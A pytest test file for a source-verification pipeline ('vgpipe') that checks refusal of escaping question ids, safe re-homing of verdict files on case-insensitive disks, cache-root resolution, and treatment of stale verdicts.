    before = _tree(tmp_path)

    with pytest.raises(ValueError, match="refusing question id"):
        judgments.path_for(run, qid)
    with pytest.raises(ValueError, match="refusing question id"):
        judgments.load(run, qid)
    with pytest.raises(ValueError, match="refusing question id"):
        judgments.record(run, qid, src().sid, "supports", "escaped")
    assert _tree(tmp_path) == before, "a refused id must write nothing, anywhere"

    # Every shape the claim schema accepts still names a shard, and nothing else does: `$` in a
    # plain `re.match` also accepts a trailing newline, naming a shard no claim ever loads.
    with pytest.raises(ValueError, match="refusing question id"):
        judgments.path_for(run, "q1\n")
    judgments.record(run, "q10.b-2_x", src().sid, "supports", "fine")
    assert list(judgments.load(run, "q10.b-2_x")) == [src().sid]


@pytest.mark.parametrize("escaping", ESCAPING_QUESTION_IDS)
def test_vg_judge_refuses_an_escaping_question_id_without_a_traceback(tmp_path, escaping):
    """The caller is an agent: the refusal has to reach it as a message it can act on."""
    from typer.testing import CliRunner

    from vgpipe import cli

    run = tmp_path / "run"
    s = src()
    (run / "claims").mkdir(parents=True)
    (run / "claims" / "q1.json").write_text(
        Claim(question_id="q1", question="?", answer="a", sources=[s]).model_dump_json())
    _cache_judged_page(run, s.url)   # or even a valid id is refused, for an uncached page
    # ...or for a source `vg verify` has given no context
    assert CliRunner().invoke(cli.app, ["verify", "--data", str(run)]).exit_code == 0

    def judge(qid):
        return CliRunner().invoke(cli.app, ["judge", qid, s.sid, "supports", "--data", str(run)])

    assert judge("q1").exit_code == 0, "a valid id still records"
    before = _tree(tmp_path)

    res = judge(escaping(run))
    assert isinstance(res.exception, SystemExit), f"a traceback, not a refusal: {res.exception!r}"
    assert res.exit_code == 1
    assert "refusing question id" in res.output
    assert _tree(tmp_path) == before, "a refused id must write nothing, anywhere"


def test_vg_judge_refuses_an_escaping_question_id_before_reading_claims(tmp_path):
    """The id is checked before anything is read, so an unrelated claims error can't stop the
    command first and send the agent off to fix the wrong thing."""
    from typer.testing import CliRunner

    from vgpipe import cli

    (tmp_path / "claims").mkdir()
    (tmp_path / "claims" / "q1.json").write_text("{")
    res = CliRunner().invoke(
        cli.app, ["judge", "../x", src().sid, "supports", "--data", str(tmp_path)])
    assert res.exit_code == 1
    assert "refusing question id" in res.output
    assert "malformed claim JSON" not in res.output


def test_a_shard_already_on_disk_is_read_whatever_its_name(tmp_path):
    """The id check guards ids that come from outside. A shard found by listing judgments/ is
    inside it by construction, so one named before the check existed must still be read —
    refusing it would stop `vg judgments` and `vg build` over a file that escapes nothing."""
    from vgpipe import judgments

    s = src()
    judgments.record(tmp_path, "q1", s.sid, "supports", "legacy")
    judgments.path_for(tmp_path, "q1").rename(tmp_path / "judgments" / "old id.json")
    every = judgments.load_every(tmp_path)
    assert list(every) == ["old id"]
    assert every["old id"][s.sid].note == "legacy"


def test_a_rehome_rewrites_a_shard_already_on_disk_whatever_its_name(tmp_path):
    """The same rule for re-homing: it backed up, rewrote and removed existing shards through
    path_for(), so one legacy name stopped the whole re-home with a traceback. Shards already
    on disk are addressed by the name they have; only a new shard's id is checked."""
    from vgpipe import judgments

    s, lapsed = src(), src(**ONLY_B)
    judgments.record(tmp_path, "q1", s.sid, "supports", "legacy")
    judgments.path_for(tmp_path, "q1").rename(tmp_path / "judgments" / "old id.json")
    judgments.record(tmp_path, "q2", lapsed.sid, "supports", "cited by nothing now")
    moved = Claim(question_id="q9", question="?", answer="a", sources=[s])

    assert judgments.rehome(tmp_path, [moved], {"old id": "q9"}) == (1, 1, ["q9"], 1)
    assert judgments.load(tmp_path, "q9")[s.sid].note == "legacy"
    assert not (tmp_path / "judgments" / "old id.json").exists()


def _miscased_run(tmp_path):
    """Shard Q1.json for claim q1, as `vg judge Q1` wrote before it checked ids. On a
    case-insensitive disk (macOS's default) the two names are one file."""
    from vgpipe import judgments

    s = src()
    judgments.record(tmp_path, "Q1", s.sid, "supports", "judged as Q1")
    return s, [Claim(question_id="q1", question="?", answer="a", sources=[s])]


def test_a_rehome_onto_an_id_differing_only_in_case_keeps_its_verdicts(tmp_path):
    """The re-home wrote q1.json and then unlinked Q1.json. Where those are one file, replacing
    it kept the old name and the unlink deleted what had just been written: `--repair` reported
    a verdict re-homed and left judgments/ empty. Either kind of disk must end with the
    verdict under the claim's exact id — named so a case-sensitive checkout of data/ reads it."""
    from vgpipe import judgments

    s, claims = _miscased_run(tmp_path)
    assert judgments.rehome(tmp_path, claims, {"Q1": "q1"}) == (1, 0, ["q1"], 1)
    assert sorted(_shards(tmp_path)) == ["q1.json"]
    assert judgments.load(tmp_path, "q1")[s.sid].note == "judged as Q1"
    assert list(judgments.load_every(tmp_path)) == ["q1"]
    # named exactly, so the next re-home finds nothing to move and rewrites nothing
    before = _shards(tmp_path)
    assert judgments.rehome(tmp_path, claims, {"q1": "q1"}) == (1, 0, ["q1"], 0)
    assert _shards(tmp_path) == before


def test_a_remap_onto_an_id_a_miscased_shard_holds_keeps_its_verdicts(tmp_path):
    """remap goes through the same commit: a claim moving onto q1 beside a stale Q1.json wrote
    its verdicts into that file and then unlinked it as the stranded shard."""
    from vgpipe import cli, judgments

    s, stale = src(), src(**ONLY_B)
    _claim_file(tmp_path, "q2", s)
    judgments.record(tmp_path, "q2", s.sid, "supports", "judged for q2")
    judgments.record(tmp_path, "Q1", stale.sid, "topic_only", "judged for a claim now gone")
    (tmp_path / "questions.json").write_text(json.dumps(
        [{"id": "q1", "text": "new q1", "claim_type": "mechanical", "maps_from": "q2"}]))

    cli.remap(data=tmp_path, apply=True)

    assert sorted(_shards(tmp_path)) == ["q1.json"]
    assert judgments.load(tmp_path, "q1")[s.sid].note == "judged for q2"
    (kept,) = judgments.archive_dir(tmp_path).iterdir()
    assert [e["note"] for e in json.loads((kept / "Q1.json").read_text())] == \
        ["judged for a claim now gone"]


def test_a_rehome_rolled_back_after_a_case_only_rename_loses_nothing(tmp_path):
    """Restoring copied each backed-up shard over the live name and then unlinked every live
    name the backup lacked. After the re-home renamed Q1.json to q1.json, the copy landed in
    q1.json (the disk keeps the name it replaces) and the unlink removed it: a rollback that
    emptied judgments/ and then retired the only other copy."""
    from vgpipe import judgments

    _, claims = _miscased_run(tmp_path)
    before = _shards(tmp_path)

    def then():
        assert sorted(_shards(tmp_path)) == ["q1.json"], "the rename really happened"
        raise OSError(28, "No space left on device")

    with pytest.raises(OSError, match="No space left"):
        judgments.rehome(tmp_path, claims, {"Q1": "q1"}, then=then)
    assert _shards(tmp_path) == before
    assert not judgments.backup_dir(tmp_path).exists()


def test_a_rehome_frees_each_leaving_name_before_it_writes_or_restores(tmp_path, monkeypatch):
    """The order is the whole of the fix, and on a case-sensitive disk — CI's — q1.json and
    Q1.json are two files, so the tests above pass in either order. Pinned here on any disk:
    every name leaving judgments/ is gone before anything is written into it, both in the
    re-home and in the restore that undoes it."""
    from vgpipe import judgments

    _, claims = _miscased_run(tmp_path)
    shards, events = tmp_path / "judgments", []
    real_write, real_copy, real_unlink = judgments._write, judgments._copy, Path.unlink

    def write(p, items):
        if p.parent == shards:
            events.append(f"write {p.name}")
        real_write(p, items)

    def copy(src, dst):
        if dst.parent == shards:
            events.append(f"write {dst.name}")
        real_copy(src, dst)

    def unlink(self, *a, **kw):
        if self.parent == shards and not self.name.startswith("."):    # not a temp file
            events.append(f"unlink {self.name}")
        return real_unlink(self, *a, **kw)

    monkeypatch.setattr(judgments, "_write", write)
    monkeypatch.setattr(judgments, "_copy", copy)
    monkeypatch.setattr(Path, "unlink", unlink)
    rewrite = []

    def then():
        rewrite.extend(events)
        events.clear()
        raise OSError(28, "No space left on device")

    with pytest.raises(OSError, match="No space left"):
        judgments.rehome(tmp_path, claims, {"Q1": "q1"}, then=then)
    assert rewrite == ["unlink Q1.json", "write q1.json"]
    assert events == ["unlink q1.json", "write Q1.json"], "the restore"


def _folds_case(tmp_path, monkeypatch, simulate: bool) -> bool:
    """Whether the disk opens Q1.json as q1.json, asked of it; or, with `simulate`, a disk that
    does. CI's disk keeps them apart, so without the simulation nothing there reaches _plan()'s
    case-insensitive branches. Only _plan() asks, through _same_file() and _disk_folds_case()."""
    from vgpipe import judgments

    if simulate:
        monkeypatch.setattr(judgments, "_same_file", lambda root, stem, qid: (
            stem.casefold() == qid.casefold() and judgments._on_disk(root, stem).exists()))
        monkeypatch.setattr(judgments, "_disk_folds_case", lambda root: True)
        return True
    assert (tmp_path / "judgments").is_dir()
    return (tmp_path / "JUDGMENTS").is_dir()


@pytest.mark.parametrize("simulate", [False, True], ids=["this-disk", "folding-disk"])
@pytest.mark.parametrize("on_disk", [True, False], ids=["one-written", "neither-written"])
def test_a_rehome_refuses_two_ids_the_disk_opens_as_one_file(tmp_path, monkeypatch, simulate,
                                                             on_disk):
    """Claims Q1 and q1 each keep verdicts, and where the disk folds case their shards are one
    file: the second write replaced the first, whose verdicts vanished with no archive entry.
    An earlier --repair guard blocked this by accident, and a later fix removed it, so the
    re-home refuses before touching anything, asking the disk even when neither shard exists
    yet."""
    from vgpipe import judgments

    s, t = src(), src(**ONLY_B)
    claims = [Claim(question_id="Q1", question="?", answer="a", sources=[s]),
              Claim(question_id="q1", question="?", answer="b", sources=[t])]
    if on_disk:
        judgments.record(tmp_path, "Q1", s.sid, "supports", "judged for Q1")
        moved = {"q7": "q1"}
    else:
        judgments.record(tmp_path, "q8", s.sid, "supports", "judged for Q1")
        moved = {"q8": "Q1", "q7": "q1"}
    judgments.record(tmp_path, "q7", t.sid, "supports", "judged for q1")
    before = _shards(tmp_path)
    if _folds_case(tmp_path, monkeypatch, simulate):
        with pytest.raises(judgments.CannotRehome, match="Q1 and q1 are one file on this disk"):
            judgments.rehome(tmp_path, claims, moved)
        assert _shards(tmp_path) == before
    else:
        assert judgments.rehome(tmp_path, claims, moved) == (2, 0, ["Q1", "q1"], 2 - on_disk)
        assert judgments.load(tmp_path, "Q1")[s.sid].note == "judged for Q1"
        assert judgments.load(tmp_path, "q1")[t.sid].note == "judged for q1"


def _lapsed_and_live(tmp_path):
    """Q1.json holding a verdict claim q1 still cites and one for a source it has dropped."""
    from vgpipe import judgments

    s, claims = _miscased_run(tmp_path)
    judgments.record(tmp_path, "Q1", src(**ONLY_B).sid, "topic_only", "since dropped")
    return s, claims


@pytest.mark.parametrize("simulate", [False, True], ids=["this-disk", "folding-disk"])
@pytest.mark.parametrize("moved", [None, {"Q1": "q1"}], ids=["unmapped", "Q1:q1"])
@pytest.mark.parametrize("q2_cites", [False, True], ids=["dropped", "dropped-q2-cites"])
def test_a_shard_the_disk_opens_as_a_claims_is_that_claims_own(tmp_path, monkeypatch, moved,
                                                                simulate, q2_cites):
    """Where the disk opens Q1.json as q1.json, `vg build` applies it to q1 and `vg judge q1`
    writes into it, so --repair files it as q1's shard: a verdict q1 dropped is archived, as in
    any shard of its own. Read as a move out of a vacant id, the shard had to bear the mapping
    out alone, and the one lapsed verdict refused the repair that `vg judgments` suggested.
    If another claim cites the dropped source, only the operator can say it lapsed, and
    `--moved Q1:q1` says so just as `--moved q1:q1` does — dropped from the mapping instead, it
    left a refusal that no flag the operator would think of could answer.
    On a case-sensitive disk it is a shard no claim has, and those rules stand."""
    from vgpipe import judgments

    s, claims = _lapsed_and_live(tmp_path)
    if q2_cites:
        claims.append(Claim(question_id="q2", question="?", answer="b", sources=[src(**ONLY_B)]))
    before = _shards(tmp_path)
    if not _folds_case(tmp_path, monkeypatch, simulate) or (q2_cites and not moved):
        with pytest.raises(judgments.CannotRehome, match="Q1/"):
            judgments.rehome(tmp_path, claims, moved)
        assert _shards(tmp_path) == before
        return
    assert judgments.rehome(tmp_path, claims, moved) == (1, 1, ["q1"], 1)
    assert sorted(_shards(tmp_path)) == ["q1.json"]
    assert judgments.load(tmp_path, "q1")[s.sid].note == "judged as Q1"
    (kept,) = judgments.archive_dir(tmp_path).iterdir()
    assert [e["note"] for e in json.loads((kept / "Q1.json").read_text())] == ["since dropped"]


def test_a_mapping_that_says_two_things_about_one_shard_is_refused(tmp_path, monkeypatch):
    """Where Q1.json is q1.json, `--moved Q1:q1 --moved q1:q5` names one shard twice; keeping
    whichever came last would be a guess."""
    from vgpipe import judgments

    s, claims = _miscased_run(tmp_path)
    claims.append(Claim(question_id="q5", question="?", answer="b", sources=[s]))
    _folds_case(tmp_path, monkeypatch, simulate=True)
    before = _shards(tmp_path)
    with pytest.raises(judgments.CannotRehome, match="Q1 and q1 are one shard on this disk"):
        judgments.rehome(tmp_path, claims, {"Q1": "q1", "q1": "q5"})
    assert _shards(tmp_path) == before


@pytest.mark.parametrize("simulate", [False, True], ids=["this-disk", "folding-disk"])
def test_a_remap_moves_the_verdicts_the_disk_files_under_its_claim(tmp_path, monkeypatch,
                                                                   simulate):
    """remap looked a shard up by its stem, so claim q1 moving to q3 left Q1.json behind — the
    shard `vg build` had been applying to q1 — and archived every verdict in it as lapsed."""
    from vgpipe import cli, judgments

    s, _claims = _miscased_run(tmp_path)
    _claim_file(tmp_path, "q1", s)
    folds_case = _folds_case(tmp_path, monkeypatch, simulate)
    (tmp_path / "questions.json").write_text(json.dumps(
        [{"id": "q3", "text": "new q3", "claim_type": "mechanical", "maps_from": "q1"}]))

    cli.remap(data=tmp_path, apply=True)

    if folds_case:
        assert sorted(_shards(tmp_path)) == ["q3.json"]
        assert judgments.load(tmp_path, "q3")[s.sid].note == "judged as Q1"
    else:
        # nothing read Q1.json here, and remap archives a shard it moves nothing out of
        assert _shards(tmp_path) == {}
        (kept,) = judgments.archive_dir(tmp_path).iterdir()
        assert [e["note"] for e in json.loads((kept / "Q1.json").read_text())] == \
            ["judged as Q1"]


def test_every_file_a_rehome_writes_is_on_disk_before_it_lands(tmp_path, monkeypatch):
    """The same rule for re-homing, and for its backup most of all: after a power loss the
    backup is the only copy of every shard the rewrite had already replaced, so an empty one
    would be the loss it exists to prevent."""
    import os

    from vgpipe import judgments

    claims, moved = _swapped_run(tmp_path)
    events: list[str] = []
    real_replace = os.replace
    monkeypatch.setattr("vgpipe.judgments.os.fsync", lambda fd: events.append("fsync"))
    monkeypatch.setattr("vgpipe.judgments.os.replace",
                        lambda a, b: (events.append(f"replace {Path(b).name}"),
                                      real_replace(a, b)))
    judgments.rehome(tmp_path, claims, moved=moved)
    replaced = [e for e in events if e.startswith("replace")]
    # two shards copied into the backup, the backup itself, two shards rewritten, one archived
    assert replaced == ["replace q1.json", "replace q2.json", "replace judgments-backup",
                        "replace q1.json", "replace q2.json", "replace q1.json",
                        # the commit: one rename, after everything it commits is durable
                        "replace judgments-backup.discard"]
    for i, e in enumerate(events):
        if e.startswith("replace"):
            assert events[i - 1] == "fsync", f"{e} landed before its contents were durable"


def test_vg_judgments_finds_an_unreadable_shard_no_claim_points_at(tmp_path, capsys):
    """`vg judgments` is the command that shows the gaps, but it only opened shards named after
    current claims — so a malformed shard left under an old id passed as healthy, and then
    `--repair` refused on the very file the plain run had not mentioned."""
    import typer

    from vgpipe import cli, judgments

    (tmp_path / "claims").mkdir()
    (tmp_path / "claims" / "q1.json").write_text(
        Claim(question_id="q1", question="?", answer="a", sources=[src()]).model_dump_json())
    stray = judgments.path_for(tmp_path, "q40")
    stray.parent.mkdir(parents=True)
    stray.write_bytes(DICT_SHAPED)

    with pytest.raises(typer.Exit) as exc:
        cli.show_judgments(data=tmp_path)
    assert exc.value.exit_code == 1
    out = re.sub(r"\x1b\[[0-9;]*m", "", "".join(capsys.readouterr().out.splitlines()))
    assert str(stray) in out


def test_an_escaped_copy_of_the_page_does_not_break_uniqueness():
    """News sites embed a "republish this story" block: an HTML-escaped copy of the whole
    article. It lands in the DOM dump as a second copy of every sentence, so uniqueness — the
    check that makes ⌘F meaningful — failed on 20 good citations at once. Falsely: a human
    pressing ⌘F on the real page gets one hit."""
    from vgpipe.fetch import _drop_escaped_markup
    from vgpipe.normalize import find_all

    article = ("She opposes a harbor levy, saying it would drive small shipping lines "
               "to look for another port.")
    text = "\n".join([
        article,
        "<p>" + article + "</p>",          # the escaped republish copy
        "&lt;h1&gt;Port commission meets Thursday&lt;/h1&gt;",
        "Share",                            # short repeats are legitimate
        "Share",
    ])
    cleaned = _drop_escaped_markup(text)
    assert len(find_all(cleaned, "opposes a harbor levy")) == 1
    assert "<p>" not in cleaned and "&lt;h1&gt;" not in cleaned
    assert cleaned.count("Share") == 2, "short lines repeat legitimately; don't collapse them"


def test_a_stray_cache_directory_does_not_reroute_the_pipeline(tmp_path):
    """_cache_root inferred the root by asking whether data.parent/cache existed, so an
    unrelated stray ./cache at the repo root silently redirected everything to a root with no
    CAL-ACCESS database — and 14 query citations failed with "not found" on a file that
    existed. A root inferred from a directory's existence fails open."""
    from vgpipe.cli import _cache_root

    (tmp_path / "data" / "cache").mkdir(parents=True)
    (tmp_path / "data" / "questions.json").write_text("[]")
    (tmp_path / "data" / "cand").mkdir()
    (tmp_path / "cache").mkdir()          # the stray

    assert _cache_root(tmp_path / "data", None) == tmp_path / "data"
    # a candidate subdir still shares its parent's cache by design
    assert _cache_root(tmp_path / "data" / "cand", None) == tmp_path / "data"

    # a data dir with no cache of its own, next to an unrelated ./cache, stays put
    other = tmp_path / "elsewhere"
    (other / "data").mkdir(parents=True)
    (other / "cache").mkdir()
    assert _cache_root(other / "data", None) == other / "data"

    # an explicit --cache always wins
    assert _cache_root(tmp_path / "data", tmp_path / "x") == tmp_path / "x"


def test_a_stray_candidate_cache_does_not_fork_the_shared_one(tmp_path, monkeypatch):
    """The rule used to be "the run's own cache/ wins if it exists", which fulfils itself: one
    fetch with --data data/<candidate> created data/<candidate>/cache, after which that stray
    WAS the cache — forking the pages and hiding the CAL-ACCESS database, so all 14 query
    citations failed at once. A candidate run shares its parent's cache by design, stray or not."""
    import io

    from rich.console import Console

    from vgpipe import cli

    out = io.StringIO()
    monkeypatch.setattr(cli, "con", Console(file=out, width=10_000, color_system=None))
    monkeypatch.setattr(cli, "_warned_strays", set())

    root = tmp_path / "data"
    cand = root / "cand"
    cand.mkdir(parents=True)
    (root / "questions.json").write_text("[]")
    (cand / "questions.json").write_text("[]")   # a scaffolded candidate has its own

    # a fresh clone: data/cache is gitignored and absent. Requiring it would fork on the very
    # first run, which then creates data/<candidate>/cache — the same self-fulfilling trap
    assert cli._cache_root(cand, None) == root
    assert out.getvalue() == ""

    # no stray: the parent's shared cache, silently
    (root / "cache").mkdir()
    assert cli._cache_root(cand, None) == root
    assert out.getvalue() == ""

    # with a stray: STILL the parent's, and the stray is named so someone cleans it up
    (cand / "cache" / "pages").mkdir(parents=True)
    assert cli._cache_root(cand, None) == root
    warning = out.getvalue()
    assert str(cand / "cache") in warning and str(root / "cache") in warning
    assert "--cache" in warning
    # once: `status` resolves the root per source, and 150 copies would bury the output
    assert cli._cache_root(cand, None) == root
    assert out.getvalue() == warning

    # a top-level data root is its own root, whatever sits beside it
    (tmp_path / "cache").mkdir()
    out.truncate(0)
    out.seek(0)
    assert cli._cache_root(root, None) == root
    assert out.getvalue() == ""

    # an explicit --cache overrides everything, stray included, and needs no warning
    assert cli._cache_root(cand, tmp_path / "x") == tmp_path / "x"
    assert out.getvalue() == ""

    # the warning names the stray verbatim: a bracketed path segment is text, not rich markup
    odd = tmp_path / "[old]" / "data"
    (odd / "cand" / "cache").mkdir(parents=True)
    (odd / "questions.json").write_text("[]")
    assert cli._cache_root(odd / "cand", None) == odd
    assert str(odd / "cand" / "cache") in out.getvalue()
    # ...and says when the shared cache doesn't exist yet, rather than pointing at nothing
    assert f"{odd / 'cache'} (not created yet)" in out.getvalue()


def test_calaccess_commands_share_the_cache_root_with_queries(tmp_path, monkeypatch):
    """`vg query` resolves the CAL-ACCESS database through _cache_root, and so must every
    `vg calaccess` command. Otherwise `vg calaccess build --data data/<candidate>` writes 1.5 GB
    into a stray candidate cache that queries then ignore — the database hidden again."""
    from vgpipe import calaccess, cli

    root = tmp_path / "data"
    cand = root / "cand"
    cand.mkdir(parents=True)
    (root / "questions.json").write_text("[]")

    seen = []
    monkeypatch.setattr(calaccess, "build", lambda r, progress=None: seen.append(r) or r)
    monkeypatch.setattr(calaccess, "find_filers", lambda r, *a, **k: seen.append(r) or [])
    monkeypatch.setattr(calaccess, "contributions_to", lambda r, *a, **k: seen.append(r) or [])
    monkeypatch.setattr(calaccess, "independent_expenditures",
                        lambda r, *a, **k: seen.append(r) or [])

    monkeypatch.setattr(calaccess, "citable_snapshot",
                        lambda url, root=None, **k: seen.append(root) or (None, "none"))
    from types import SimpleNamespace

    from vgpipe import queries
    monkeypatch.setattr(queries, "run", lambda name, params, r: seen.append(r)
                        or SimpleNamespace(found=True, value=1, note="", version=1,
                                           export_date=""))

    def every_command(**kw):
        cli.calaccess_build(data=cand, **kw)
        cli.calaccess_filer("Ko", data=cand, **kw)
        cli.calaccess_contributions("123", data=cand, **kw)
        cli.calaccess_ie("Ko", data=cand, first="Dana", **kw)
        cli.calaccess_cite("123", data=cand, **kw)
        cli.run_query("contributor_total", param=["filer_id=123"], data=cand, **kw)

    every_command()
    assert seen == [root] * 6

    # and every one of them takes --cache: the commands a reviewer re-checks a figure with must
    # reach the database `vg verify --cache` checked it against
    seen.clear()
    every_command(cache=tmp_path / "shared")
    assert seen == [tmp_path / "shared"] * 6


def test_a_verdict_does_not_outlive_the_text_it_judged(tmp_path, monkeypatch):
    """A judgment is a claim about a source AS CACHED AT JUDGMENT TIME. Six were recorded as
    "roster-only, no bill number"; a later re-fetch put the bill number back, leaving six
    settled-looking rejections describing text that no longer exists.

    The direction matters less than the silence: here staleness made the pipeline harsher than
    the evidence warranted, costing good citations. A `supports` surviving a re-fetch that
    REMOVED the supporting text would ship a green row nobody checked. Same mechanism."""
    from datetime import UTC, datetime, timedelta

    from vgpipe import judgments
    from vgpipe.models import EXTRACTOR_VERSION, PageCache

    s = src()
    page = PageCache(url=s.url, final_url=s.url, status=200, content_type="text/html",
                     text="roster only", fetched_at=datetime.now(UTC),
                     extractor_version=EXTRACTOR_VERSION)
    monkeypatch.setattr("vgpipe.fetch.load_cached", lambda root, url: page)

    judgments.record(tmp_path, "q1", s.sid, "topic_only", "roster-only, no bill number",
                     page_fetched_at=str(page.fetched_at),
                     extractor_version=EXTRACTOR_VERSION)
    claim = Claim(question_id="q1", question="?", answer="a", sources=[s])

    assert judgments.apply_to(claim, tmp_path, cache_root=tmp_path) == []
    assert claim.sources[0].verification.support == "topic_only"

    # the page is re-fetched: the verdict no longer describes it
    page.fetched_at = datetime.now(UTC) + timedelta(hours=6)
    claim.sources[0].verification.support = "unreviewed"
    stale = judgments.apply_to(claim, tmp_path, cache_root=tmp_path)
    assert len(stale) == 1 and "re-fetched" in stale[0]
    assert claim.sources[0].verification.support == "unreviewed", (
        "a stale verdict must not be applied; unjudged fails toward re-checking")

    # a verdict recorded under an older extractor is stale too
    page.fetched_at = datetime.now(UTC) - timedelta(hours=6)
    judgments.record(tmp_path, "q1", s.sid, "supports", "fine now",
                     page_fetched_at=str(page.fetched_at),
                     extractor_version=EXTRACTOR_VERSION - 1)
    stale = judgments.apply_to(claim, tmp_path, cache_root=tmp_path)
    assert len(stale) == 1 and "re-extracted" in stale[0]


# --- vg judgments: the unjudged count -------------------------------------------------


def _judgments_fixture(tmp_path):
    """Two questions, five cited sources, verified the way `vg verify` would against pages in
    the cache: two fresh verdicts, one source never judged, and one stale verdict of each kind
    (page re-fetched since; page re-extracted since). Plus a verdict whose citation has since
    changed, which must not count toward anything."""
    from datetime import timedelta

    from vgpipe import judgments
    from vgpipe.fetch import cache_path
    from vgpipe.models import EXTRACTOR_VERSION

    data = tmp_path / "data"
    now = datetime.now(UTC)
    earlier = now - timedelta(hours=6)

    def cite(url, qid, verdict=None, *, judged_page_at=now, judged_version=EXTRACTOR_VERSION):
        s = src(url=url, snippet=f"a distinctive quote from {url}")
        cache_path(data, url).write_text(
            _page(url=url, final_url=url, fetched_at=now, extractor_version=EXTRACTOR_VERSION,
                  text=f"Some lead-in. {s.snippet}. Some tail.").model_dump_json())
        verify_source(s, data, rules=RULES)          # served from the cache: no network
        assert s.verification.status == "verified"
        if verdict:
            judgments.record(data, qid, s.sid, verdict, "note",
                             page_fetched_at=str(judged_page_at),
                             extractor_version=judged_version)
        return s

    q1 = [cite("https://calmatters.org/a", "q1", "supports"),
          cite("https://calmatters.org/b", "q1"),                          # never judged
          cite("https://calmatters.org/c", "q1", "topic_only",
               judged_page_at=earlier)]                                    # page re-fetched since
    q2 = [cite("https://calmatters.org/d", "q2", "contradicts"),
          cite("https://calmatters.org/e", "q2", "supports",
               judged_version=EXTRACTOR_VERSION - 1)]                      # re-extracted since
    judgments.record(data, "q2", "0123456789ab", "supports", "its citation changed")

    (data / "claims").mkdir()
    for qid, sources in (("q1", q1), ("q2", q2)):
        (data / "claims" / f"{qid}.json").write_text(
            Claim(question_id=qid, question="?", answer="a", sources=sources).model_dump_json())
    return data


def _judgments_output(data, *args):
    import re

    from typer.testing import CliRunner

    from vgpipe import cli

    res = CliRunner().invoke(cli.app, ["judgments", "--data", str(data), *args])
    return res.exit_code, re.sub(r"\x1b\[[0-9;]*m", "", res.output)


def _unjudged(data, question_id="", cache=None):
    """(need a verdict, total, stale, blocked), read off what `vg judgments` prints: the gate
    line, and the line for sources a verifier can't judge yet (0 when it isn't printed)."""
    import re

    args = ["--question-id", question_id] if question_id else []
    if cache:
        args += ["--cache", str(cache)]
    code, out = _judgments_output(data, *args)
    m = re.search(r"(\d+) of (\d+) cited source\(s\) need a verdict \((\d+) stale\)", out)
    assert m, out
    assert code == (1 if int(m.group(1)) else 0), "exit 0 must mean done, and only that"
    b = re.search(r"(\d+) more source\(s\) have nothing a verifier can judge yet", out)
    return (*(int(x) for x in m.groups()), int(b.group(1)) if b else 0)


def _built_unreviewed(data):
    """{url: status} for every source `vg build` writes out without a verdict."""
    import json

    from typer.testing import CliRunner

    from vgpipe import cli

    res = CliRunner().invoke(cli.app, ["build", "--data", str(data)])
    assert res.exit_code == 0, res.output
    built = json.loads((data / "out" / "claims.json").read_text())
    return {s["url"]: s["verification"]["status"] for c in built for s in c["sources"]
            if s["verification"]["support"] == "unreviewed"}


def _edit_claim(data, qid, i, **verification):
    import json

    p = data / "claims" / f"{qid}.json"
    raw = json.loads(p.read_text())
    raw["sources"][i]["verification"].update(verification)
    p.write_text(json.dumps(raw))


def _rewrite_page(data, url, text):
    """The cached copy changes under a recorded verification, fetch time unchanged."""
    from vgpipe.fetch import cache_path
    from vgpipe.models import PageCache

    page = PageCache.model_validate_json(cache_path(data, url).read_text())
    page.text = text
    cache_path(data, url).write_text(page.model_dump_json())


def test_judgments_prints_one_unjudged_count(tmp_path):
    """Sessions decided the judgment pass was finished by running `grep -c unreviewed` over the
    table. The table wraps, so that under-reported twice and a run read as done while sources
    had no verdict. The gate is one number the tool prints, and it honours the filter."""
    data = _judgments_fixture(tmp_path)
    assert _unjudged(data) == (3, 5, 2, 0)
    assert _unjudged(data, "q1") == (2, 3, 1, 0)
    assert _unjudged(data, "q2") == (1, 2, 1, 0)


def test_judgments_never_prints_done_for_nothing_or_for_what_it_could_not_read(tmp_path):
    """A typo'd --question-id or --data printed a green "0 of 0 ... need a verdict", the line a
    verifier is told means done. So did a run whose unreadable claim files load_claims skipped:
    their sources were simply not in the count."""
    data = _judgments_fixture(tmp_path)
    code, out = _judgments_output(data, "--question-id", "Q1")
    assert code == 1 and "need a verdict" not in out
    code, out = _judgments_output(tmp_path / "no-such-run")
    assert code == 1 and "need a verdict" not in out

    (data / "claims" / "q3.json").write_text('{"question_id": "q3", "question": "?"}')
    code, out = _judgments_output(data)
    assert code == 1
    assert "1 claim(s) could not be read" in out and "q3" in out
    # not even a red "0 of M": `vg judgments | tail -1` loses the exit status to the pipe
    assert "need a verdict" not in out
    assert _unjudged(data, "q1") == (2, 3, 1, 0), "a filter that excludes it is unaffected"


def test_judgments_repair_refuses_while_a_claim_is_unreadable(tmp_path):
    """rehome() re-files verdicts under whichever claim cites them and drops the rest, so an
    unreadable claim's verdicts would be deleted as orphans — for good."""
    import json

    from vgpipe import judgments

    data = _judgments_fixture(tmp_path)
    (data / "claims" / "q1.json").write_text('{"question_id": "q1", "question": "?"}')
    before = json.loads((data / "judgments" / "q1.json").read_text())
    code, out = _judgments_output(data, "--repair")
    assert code == 1 and "not repairing" in out
    assert json.loads((data / "judgments" / "q1.json").read_text()) == before
    assert len(judgments.load(data, "q1")) == 2


def test_judgments_repair_is_not_blocked_by_the_question_filter(tmp_path):
    """Repair exists for verdicts stranded under an old question id, so `--repair
    --question-id <old id>` must repair before the filter reports there is no such claim."""
    import json

    data = _judgments_fixture(tmp_path)
    (data / "judgments" / "q1.json").rename(data / "judgments" / "q1-old.json")
    code, out = _judgments_output(data, "--repair", "--moved", "q1-old:q1",
                                  "--question-id", "q1-old")
    assert "re-homed 2 verdict(s); 4 filed" in out  # a, c back to q1; d, e stay on q2
    assert code == 1 and "no claim with question id 'q1-old'" in out
    assert len(json.loads((data / "judgments" / "q1.json").read_text())) == 2


def test_judgments_count_treats_a_stale_verdict_as_no_verdict(tmp_path):
    """`vg build` drops a verdict that predates its page and the source reverts to unreviewed.
    A count that trusts any recorded verdict says 0 left while build shows pending rows —
    the same fixture, judged by `apply_to()` itself, must give the same number."""
    from vgpipe import judgments
    from vgpipe.cli import load_claims

    data = _judgments_fixture(tmp_path)
    claims = load_claims(data / "claims", trust_machine_fields=True)
    dropped = [x for c in claims for x in judgments.apply_to(c, data, cache_root=data)]
    unreviewed = sum(s.verification.support == "unreviewed" for c in claims for s in c.sources)
    assert (unreviewed, len(dropped)) == (3, 2)
    assert _unjudged(data)[::2] == (unreviewed, len(dropped))


def test_judgments_count_agrees_with_what_build_renders(tmp_path):
    """The count is only worth reading if it predicts the review app. Every source build writes
    out without a verdict is either waiting on one (the gate) or has nothing a verifier can
    judge yet — never neither, never both."""
